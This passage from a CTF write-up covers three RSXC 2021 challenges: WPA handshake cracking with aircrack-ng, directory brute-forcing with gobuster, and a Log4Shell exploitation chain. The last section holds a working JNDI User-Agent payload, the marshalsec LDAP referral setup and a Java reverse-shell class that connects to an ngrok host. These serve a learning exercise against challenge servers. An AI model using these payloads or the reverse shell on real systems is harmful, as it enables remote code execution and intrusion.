<p>We are given a pcap file containing some WPA network sniffed packet. Along with the hint of <code>&quot;Can you Rock our world?&quot;</code>, hinting to the usage of <code>rockyou.txt</code>. I guessed we could recover or bruteforce the password starting with an <code>S</code> for this network for us to read the encrypted data. Since I didn’t have any computer with GPU on hand, bruteforcing with a tool running with CPU such as <code>john-the-ripper</code> or <code>aircrack-nk</code> was the only choice. I chose to go with the latter, <code>aircrack-ng</code> (an 802.11 WEP and WPA/WPA2-PSK key cracking program), for this job.</p>
<p>In order to make the bruteforcing a lot faster, I narrowed down the wordlist of rockyou by filtering out the passwords starting with an uppercase <code>S</code> through a quick python script:</p>
<pre class="language-python="><!-- HTML_TAG_START --><code class="language-python=">f2 = open(&quot;filtered.txt&quot;, &quot;a&quot;)
with open(&quot;/usr/share/wordlists/rockyou.txt&quot;, &quot;rb&quot;) as f:
    a = [x for x in f.readlines()]
    for line in a:
        try:
            if line[0] == 83: # &quot;S&quot;
                f2.write(line.decode())
        except:
            pass
f2.close()</code><!-- HTML_TAG_END --></pre>
<p>After having filtered out and produced a smaller wordlist, retrieving the password of the network is just as simple as running the following command:</p>
<pre class="language-undefined"><!-- HTML_TAG_START --><code class="language-undefined">juki@izone:~/Desktop/ctf/rsxc2021$ aircrack-ng 22-challenge.cap -w filtered.txt
Reading packets, please wait...
Opening 22-challenge.cap
Read 63 packets.

   #  BSSID              ESSID                     Encryption

   1  1A:2F:49:69:AA:0A  Private                   WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening 22-challenge.cap
Read 63 packets.

1 potential targets



                               Aircrack-ng 1.6

      [00:01:28] 97735/98553 keys tested (1118.76 k/s)

      Time left: 0 seconds                                      99.17%

                         KEY FOUND! [ Santaclaws99 ]


      Master Key     : 98 91 0D 48 C4 92 05 45 42 CB 4C AF 72 3B 11 C8
                       EA EB BE 40 FD 9A 01 E8 43 D8 A2 F0 AD 36 37 DD

      Transient Key  : 77 3D 16 7F 4D C5 78 93 1F C9 2C 58 1F 82 9A 6C
                       A7 FF 49 BB 44 20 9C 07 D5 BD 72 B7 0E 47 39 51
                       AD 5D DA 9D AD D8 87 6F DE 5E 86 F5 33 FB 8B 18
                       4B FD D7 06 8D 6C 8A 34 36 77 D7 E1 AA 7F 93 8E

      EAPOL HMAC     : 7C 95 55 6F 18 39 03 44 43 64 CD D0 AB 25 89 0B

</code><!-- HTML_TAG_END --></pre>
<p>The password we retrieved is: <code>Santaclaws99</code>.</p>
<p>In order to read the encoded pcap network data in wireshark now, we have to add in the password of the network as the decryption key. This can be done in preferences:
<code>Edit &gt; Preferences… &gt; Protocols &gt; IEEE 802.11 &gt; Decription keys &gt; Edit</code>
<img src="https://i.imgur.com/f1wYfVS.png" alt="wireshark decryption key preferences">
<img src="https://i.imgur.com/ya1nPMb.png" alt="wireshark decryption key added"></p>
<p>Adding the password, we can now see some TCP packets being sent. The flag is found after following that said TCP packet.
<img src="https://i.imgur.com/6GndJFX.png" alt="wireshark flag output"></p>
<p>The flag is: <code>RSXC{WIFI_is_fun}</code></p>
<h2 id="day-23-locating-the-location"><a href="#day-23-locating-the-location">[DAY 23] Locating the location</a></h2>
<h3 id="challenge-22"><a href="#challenge-22">Challenge</a></h3>
<blockquote><p>We seem to have lost a file, can you please help us find it?
<a href="http://rsxc.no:20023/" rel="noopener" class="text-link" target="_blank">http://rsxc.no:20023</a></p></blockquote>
<h3 id="solution-22"><a href="#solution-22">Solution</a></h3>
<p>Upon navigating to the site, we are greeted with a text saying that a <code>flag.txt</code> file was lost in a subfolder on the server hosting the site. The directory name is said to also be found in dirb’s <code>small.txt</code> wordlist, and that the functionality of directory listing is not enabled, meaning we will receive a status code of 200 whatever directory we search for.</p>
<p>From this I could guess that this challenge was of content discovery and directory bruteforcing, and was thus the approach I began to try. Knowing that the directory listing is not enabled, I knew that I couldn’t run the wordlist as it is, but have to somehow manipulate it by directly searching for the file <code>flag.txt</code>. This was done by modifying the wordlist a little by appending the path <code>/flag.txt</code> to every line in the wordlist. A quick python script for this can be seen here:</p>
<pre class="language-python"><!-- HTML_TAG_START --><code class="language-python">f2 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"small.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/usr/share/wordlists/dirb/small.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    a <span class="token operator">=</span> <span class="token punctuation">[</span>x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> a<span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            f2<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token operator">+</span><span class="token string">"/flag.txt"</span><span class="token operator">+</span><span class="token string">"&#92;n"</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
f2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
<p>Running <code>gobuster</code>, a directory bruteforcing tool, on the modified wordlist and then outputting the results of the body length (response length) to a file, I can search for the flag as a response with a response length different from the others:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ gobuster -fw -u http://rsxc.no:20023/ -w small.txt -l -o result
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">head</span> result -n <span class="token number">10</span>
/03/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/10/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/01/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/00/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/1/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/100/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/1000/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/123/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/0/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/02/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">grep</span> -v <span class="token string">"Size: 20"</span> result <span class="token comment"># since [Size: 20] should indicate the message "404 - File not found"</span>
/logfile/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">120</span><span class="token punctuation">]</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -s http://rsxc.no:20023/logfile/flag.txt <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"RSXC&#123;.*&#125;"</span>
RSXC<span class="token punctuation">&#123;</span>Content_discovery_is_a_useful_to_know.Good_job_finding_the_flag<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{Content_discovery_is_a_useful_to_know.Good_job_finding_the_flag}</code></p>
<h2 id="day-24-the-watcher"><a href="#day-24-the-watcher">[DAY 24] The watcher</a></h2>
<h3 id="challenge-23"><a href="#challenge-23">Challenge</a></h3>
<blockquote><p>We have found a service that watches our every step, are you able to figure out how we can read the FLAG from the environment? NB. Container will be restarted every 30 minutes.
<a href="http://rsxc.no:20024/" rel="noopener" class="text-link" target="_blank">http://rsxc.no:20024</a></p></blockquote>
<h3 id="solution-23"><a href="#solution-23">Solution</a></h3>
<p>Looking at the challenge description I could guess from the get go that it was going to be about the new vulnerability known as Log4Shell (<code>CVE-2021-44228</code>) affecting the Java logging package <code>log4j</code>. To confirm this, navigating to the site, we are greeted with the sentence of <code>Be careful, I&#39;m logging everything...</code> hinting to some form of <code>logging</code>. Fuzzing for some directories such as <code>http://rsxc.no:20024/test</code> for instance, results in a <code>Whitelabel Error Page</code> due to not having set up a dedicated error page yet. Googling this tells us that we are indeed working with a Java web application, running on Spring Boot:</p>
<blockquote><p>WhiteLabel Error Page is a generic Spring Boot error page that is displayed when no custom error page is present.</p></blockquote>
<p>Using the site <a href="https://log4j-tester.trendmicro.com/" rel="noopener" class="text-link" target="_blank">https://log4j-tester.trendmicro.com/</a> I can test for locations suitable for the JNDI attack vector, and further finds that most of the user-supplied data and headers could actually be exploited as “everything is being logged”. For this case, I used the User-Agent header. To further test this for ourselves, preparing a netcat listener, and then curl’ing the site with the JNDI payload results in a connection:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@peko:~$ <span class="token function">nc</span> -lvnp <span class="token number">9001</span>
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span>
Connection received on <span class="token number">127.0</span>.0.1 <span class="token number">53502</span>
<span class="token number">0</span>
 &#96;�</code><!-- HTML_TAG_END --></pre>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~$ <span class="token function">curl</span> -H <span class="token string">'User-Agent: $&#123;jndi:ldap://4.tcp.ngrok.io:14996/a&#125;'</span> <span class="token string">'http://rsxc.no:20024'</span></code><!-- HTML_TAG_END --></pre>
<p>The site is indeed confirmed to be vulnerable to Log4Shell!</p>
<p>To exploiting the server, I setup my attack chain like so:</p>
<ol class="list"><li>Begin with a payload of <code>${jndi:ldap://localhost:1389/Exploit}</code> that reaches our LDAP Referral Server</li>
<li>Our LDAP Referral Server then forwards the request to a secondary HTTP server http://localhost:8000/Exploit.class</li>
<li>The victim server will then retrieve and execute the code present in http://localhost:8000/Exploit.class, making it possible to run arbitrary code and command we send in</li></ol>
<p>Utilizing both the tool localtunnel (<code>lt -port 8000</code>) and ngrok (<code>ngrok tcp 1389</code>), I can expose my localhost connection to the Internet freely using two computers hosting the local servers for the attack. The following tunnel forwarding is in this case, as such:</p>
<pre class="language-undefined"><!-- HTML_TAG_START --><code class="language-undefined"># Computer 1
tcp://8.tcp.ngrok.io:16405 -&gt; localhost:1389 # LDAP Referral Server
http://calm-warthog-89.loca.lt -&gt; localhost:8000 # HTTP server

# Computer 2
tcp://4.tcp.ngrok.io:14996 -&gt; localhost:9001 # Netcat reverse shell</code><!-- HTML_TAG_END --></pre>
<p>First, with the <a href="https://github.com/mbechler/marshalsec" rel="noopener" class="text-link" target="_blank">marshalsec utility</a>, I start my LDAP referral server to direct connections to my secondary HTTP server:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021/marshalsec$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token string">"http://calm-warthog-89.loca.lt/#Exploit"</span>
Listening on <span class="token number">0.0</span>.0.0:1389</code><!-- HTML_TAG_END --></pre>
<p>Following that I set up the HTTP server, and also start the netcat listener on the other computer:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ python3 -m http.server
Serving HTTP on <span class="token number">0.0</span>.0.0 port <span class="token number">8000</span> <span class="token punctuation">(</span>http://0.0.0.0:8000/<span class="token punctuation">)</span> <span class="token punctuation">..</span></code><!-- HTML_TAG_END --></pre>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@peko:~$ <span class="token function">nc</span> -lvnp <span class="token number">9001</span>
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span></code><!-- HTML_TAG_END --></pre>
<p>Having all the servers correctly up and running, the finishing touches for the attack payload would be to fix up the code for the exploit (<code>Exploit.class</code>) and then running a curl to the server with our attack payload. A exploit code solution for a reverse shell can be seen below:</p>
<pre class="language-java"><!-- HTML_TAG_START --><code class="language-java"><span class="token comment">// Exploit.java</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">OutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">&#123;</span>

	<span class="token keyword">public</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
		<span class="token class-name">String</span> host<span class="token operator">=</span><span class="token string">"4.tcp.ngrok.io"</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> port<span class="token operator">=</span><span class="token number">14996</span><span class="token punctuation">;</span>
		<span class="token class-name">String</span> cmd<span class="token operator">=</span><span class="token string">"/bin/sh"</span><span class="token punctuation">;</span>
		<span class="token class-name">Process</span> p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">Socket</span> s<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">InputStream</span> pi<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
								pe<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getErrorStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
								si<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">OutputStream</span> po<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>so<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">isClosed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">while</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>
				so<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">while</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>
				so<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">while</span><span class="token punctuation">(</span>si<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>
				po<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>si<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			so<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			po<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
				p<span class="token punctuation">.</span><span class="token function">exitValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
		p<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		s<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>Having everything ready and set up, we run our attack:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ javac Exploit.java -source <span class="token number">8</span> -target <span class="token number">8</span>
warning: <span class="token punctuation">[</span>options<span class="token punctuation">]</span> bootstrap class path not <span class="token builtin class-name">set</span> <span class="token keyword">in</span> conjunction with -source <span class="token number">8</span>
<span class="token number">1</span> warning
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -H <span class="token string">'User-Agent: $&#123;jndi:ldap://8.tcp.ngrok.io:16405/Exploit&#125;'</span> <span class="token string">'http://rsxc.no:20024'</span>
</code><!-- HTML_TAG_END --></pre>
<p>Upon running the two commands above, we receive a reverse shell on our netcat listener and can freely <code>cat</code> the flag:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@peko:~$ <span class="token function">nc</span> -lvnp <span class="token number">9001</span>
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span>
Connection received on <span class="token number">127.0</span>.0.1 <span class="token number">53624</span>
<span class="token function">ls</span>
app
bin
dev
etc
flag.txt
home
lib
media
mnt
proc
root
run
sbin
srv
sys
tmp
usr
var
<span class="token function">cat</span> flag.txt
RSXC<span class="token punctuation">&#123;</span>We_do_like_logging_right?<span class="token punctuation">&#125;</span>
<span class="token function">env</span>
<span class="token assign-left variable">JAVA_ALPINE_VERSION</span><span class="token operator">=</span><span class="token number">8.181</span>.13-r0
<span class="token assign-left variable"><span class="token environment constant">HOSTNAME</span></span><span class="token operator">=</span>040a0b24af81
<span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span>/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjdk/jre/<span class="token punctuation">..</span>/lib/amd64
<span class="token assign-left variable"><span class="token environment constant">SHLVL</span></span><span class="token operator">=</span><span class="token number">1</span>
<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/root
<span class="token assign-left variable">JAVA_VERSION</span><span class="token operator">=</span>8u181
<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin
<span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>C.UTF-8
<span class="token assign-left variable">JAVA_HOME</span><span class="token operator">=</span>/usr/lib/jvm/java-1.8-openjdk
<span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/
<span class="token assign-left variable">FLAG</span><span class="token operator">=</span>base32_KJJVQQ33K5SV6ZDPL5WGS23FL5WG6Z3HNFXGOX3SNFTWQ5B7PU</code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{We_do_like_logging_right?}</code></p>
</section></main>

<footer class="svelte-1lfjegf"><p>Design by Shirajuki (2022)</p>
</footer>


		<script type="module" data-sveltekit-hydrate="zz4xr9">
		import { set_public_env, start } from "/_app/immutable/start-970782a7.js";

		set_public_env({});

		start({
			target: document.querySelector('[data-sveltekit-hydrate="zz4xr9"]').parentNode,
			paths: {"base":"","assets":""},
			session: {},
			route: true,
			spa: false,
			trailing_slash: "never",
			hydrate: {
				status: 200,
				error: null,
				nodes: [0, 9],
				params: {},
				routeId: "blog/rsxc"
			}
		});
	</script></div>
  </body>
</html>
